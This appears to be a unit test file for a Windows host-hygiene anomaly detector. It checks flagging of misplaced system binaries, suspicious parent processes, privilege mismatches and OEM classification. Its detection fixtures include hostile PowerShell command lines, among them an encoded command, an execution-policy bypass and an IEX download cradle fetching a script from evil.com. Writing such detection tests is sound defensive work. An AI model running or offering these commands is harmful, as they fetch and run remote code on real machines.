"""Unit and Integration Tests for Enriched Telemetry, OEM Profiles, and Persistence Auditing."""

import unittest
import tempfile
import os
import json
from host_hygiene.collector.base import ProcessInfo
from host_hygiene.detector.anomaly_engine import AnomalyDetectionEngine
from host_hygiene.baseline.oem_profiles import classify_hardware_or_oem
from host_hygiene.baseline.cache import BaselineCache
from host_hygiene.baseline.os_filter import OSBaselineFilter
from host_hygiene.collector.persistence import PersistenceAuditor
from host_hygiene.triage.offline_triage import OfflineTriageEngine


class TestEnrichedSecurity(unittest.TestCase):

    def setUp(self):
        self.engine_win = AnomalyDetectionEngine(platform_name="windows")

    def test_canonical_path_mismatch_detection(self):
        """Flag core OS binaries running outside canonical directories (e.g. svchost outside System32)."""
        # Malicious svchost in Temp directory
        bad_proc = ProcessInfo(
            pid=5555,
            name="svchost.exe",
            path=r"C:\Users\Victim\AppData\Local\Temp\svchost.exe",
        )
        findings = self.engine_win.analyze_process(bad_proc)
        self.assertTrue(any(f.anomaly_type == "CANONICAL_PATH_MISMATCH" and f.severity == "CRITICAL" for f in findings))

        # Malicious lsass in ProgramData
        bad_lsass = ProcessInfo(
            pid=5556,
            name="lsass.exe",
            path=r"C:\ProgramData\lsass.exe",
        )
        findings2 = self.engine_win.analyze_process(bad_lsass)
        self.assertTrue(any(f.anomaly_type == "CANONICAL_PATH_MISMATCH" for f in findings2))

        # Legitimate svchost in System32
        good_proc = ProcessInfo(
            pid=5557,
            name="svchost.exe",
            path=r"C:\Windows\System32\svchost.exe",
        )
        findings3 = self.engine_win.analyze_process(good_proc)
        self.assertFalse(any(f.anomaly_type == "CANONICAL_PATH_MISMATCH" for f in findings3))

    def test_anomalous_parent_process_lineage(self):
        """Flag Office apps, browsers, or web servers spawning shells/interpreters."""
        # WinWord spawning PowerShell
        proc1 = ProcessInfo(
            pid=6001,
            name="powershell.exe",
            parent={"pid": 4000, "name": "winword.exe"},
        )
        findings1 = self.engine_win.analyze_process(proc1)
        self.assertTrue(any(f.anomaly_type == "ANOMALOUS_PARENT_LINEAGE" and f.severity == "CRITICAL" for f in findings1))

        # Chrome spawning cmd
        proc2 = ProcessInfo(
            pid=6002,
            name="cmd.exe",
            parent={"pid": 4001, "name": "chrome.exe"},
        )
        findings2 = self.engine_win.analyze_process(proc2)
        self.assertTrue(any(f.anomaly_type == "ANOMALOUS_PARENT_LINEAGE" for f in findings2))

        # Normal shell spawn from Explorer (benign user interaction)
        proc3 = ProcessInfo(
            pid=6003,
            name="cmd.exe",
            parent={"pid": 4002, "name": "explorer.exe"},
        )
        findings3 = self.engine_win.analyze_process(proc3)
        self.assertFalse(any(f.anomaly_type == "ANOMALOUS_PARENT_LINEAGE" for f in findings3))

    def test_command_line_suspicious_arguments(self):
        """Inspect command lines for hidden windows, encoded payloads, or download cradles."""
        # Encoded PowerShell command
        p1 = ProcessInfo(
            pid=7001,
            name="powershell.exe",
            command_line="powershell.exe -enc SQBFAFgA0123456789",
        )
        f1 = self.engine_win.analyze_process(p1)
        self.assertTrue(any(f.anomaly_type == "ENCODED_COMMAND_EXECUTION" for f in f1))

        # Hidden window execution
        p2 = ProcessInfo(
            pid=7002,
            name="powershell.exe",
            command_line="powershell.exe -w hidden -ep bypass -c calc.exe",
        )
        f2 = self.engine_win.analyze_process(p2)
        self.assertTrue(any(f.anomaly_type == "HIDDEN_WINDOW_EXECUTION" for f in f2))
        self.assertTrue(any(f.anomaly_type == "EXECUTION_POLICY_BYPASS" for f in f2))

        # Download cradle
        p3 = ProcessInfo(
            pid=7003,
            name="powershell.exe",
            command_line="powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://evil.com/s.ps1')",
        )
        f3 = self.engine_win.analyze_process(p3)
        self.assertTrue(any(f.anomaly_type == "MEMORY_DOWNLOAD_CRADLE" for f in f3))

    def test_privilege_mismatch(self):
        """Flag mandatory system processes running under standard non-SYSTEM user accounts."""
        # lsass running as standard user
        p1 = ProcessInfo(
            pid=8001,
            name="lsass.exe",
            user=r"LAPTOP\standard_user",
        )
        f1 = self.engine_win.analyze_process(p1)
        self.assertTrue(any(f.anomaly_type == "PRIVILEGE_MISMATCH" and f.severity == "CRITICAL" for f in f1))

        # lsass running legitimately as SYSTEM
        p2 = ProcessInfo(
            pid=8002,
            name="lsass.exe",
            user=r"NT AUTHORITY\SYSTEM",
        )
        f2 = self.engine_win.analyze_process(p2)
        self.assertFalse(any(f.anomaly_type == "PRIVILEGE_MISMATCH" for f in f2))

    def test_hardware_and_oem_profile_classification(self):
        """Verify ThinkPad/Lenovo, Intel Core Ultra, and Developer tools recognition."""
        # Lenovo
        self.assertEqual(classify_hardware_or_oem("LenovoVantageService"), "OEM:Lenovo")
        self.assertEqual(classify_hardware_or_oem("PowerMgr"), "OEM:Lenovo")
        self.assertEqual(classify_hardware_or_oem("tphkload"), "OEM:Lenovo")
        self.assertEqual(classify_hardware_or_oem("tposd"), "OEM:Lenovo")

        # Intel
        self.assertEqual(classify_hardware_or_oem("ipfsvc"), "OEM:Intel")
        self.assertEqual(classify_hardware_or_oem("ipf_uf"), "OEM:Intel")
        self.assertEqual(classify_hardware_or_oem("igfxShaderDistributionService"), "OEM:Intel")
        self.assertEqual(classify_hardware_or_oem("IntelAudioService"), "OEM:Intel")

        # Developer tools
        self.assertEqual(classify_hardware_or_oem("vmware"), "DevTools")
        self.assertEqual(classify_hardware_or_oem("git-bash"), "DevTools")
        self.assertEqual(classify_hardware_or_oem("mintty"), "DevTools")
        self.assertEqual(classify_hardware_or_oem("python"), "DevTools")

        # Unrecognized binary
        self.assertIsNone(classify_hardware_or_oem("totally_random_binary"))

    def test_persistent_baseline_cache(self):
        """Test persistent caching of verified (path, sha256) pairs and integration with OSBaselineFilter."""
        temp_cache = tempfile.mktemp(suffix=".json")
        try:
            cache = BaselineCache(cache_file=temp_cache)
            cache.set(
                path=r"C:\Program Files\Lenovo\CustomUtility.exe",
                sha256="1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
                signature={"status": "VALID", "publisher": "Lenovo"},
                classification="OEM:Lenovo",
            )
            cache.save()

            # Reload cache from disk
            cache2 = BaselineCache(cache_file=temp_cache)
            cached_item = cache2.get(
                r"C:\Program Files\Lenovo\CustomUtility.exe",
                "1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
            )
            self.assertIsNotNone(cached_item)
            self.assertEqual(cached_item["classification"], "OEM:Lenovo")

            # Filter integration
            b_filter = OSBaselineFilter(cache=cache2)
            p = ProcessInfo(
                pid=9999,
                name="CustomUtility.exe",
                path=r"C:\Program Files\Lenovo\CustomUtility.exe",
                sha256="1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
            )
            self.assertTrue(b_filter.is_baseline(p, "windows"))
        finally:
            if os.path.exists(temp_cache):
                os.remove(temp_cache)

    def test_enriched_schema_conformance(self):
        """Ensure ProcessInfo and ProcessTriageEvaluation serialize to the requested enriched schema."""
        proc = ProcessInfo(
            pid=1234,
            name="example.exe",
            path=r"C:\Program Files\Vendor\example.exe",
            parent={"pid": 5678, "name": "services.exe"},
            command_line="example.exe --service",
            sha256="abc123def456",
            user=r"NT AUTHORITY\SYSTEM",
            signature={"status": "VALID", "publisher": "Vendor Inc"},
            network_connections=[{"local_port": 8080, "type": "TCP_LISTEN"}],
            classification="VerifiedVendor:System",
        )
        d = proc.to_dict()
        required_keys = [
            "pid",
            "process_name",
            "path",
            "parent",
            "command_line",
            "sha256",
            "user",
            "signature",
            "network_connections",
            "classification",
        ]
        for k in required_keys:
            self.assertIn(k, d)
        self.assertEqual(d["parent"]["pid"], 5678)
        self.assertEqual(d["parent"]["name"], "services.exe")


if __name__ == "__main__":
    unittest.main()
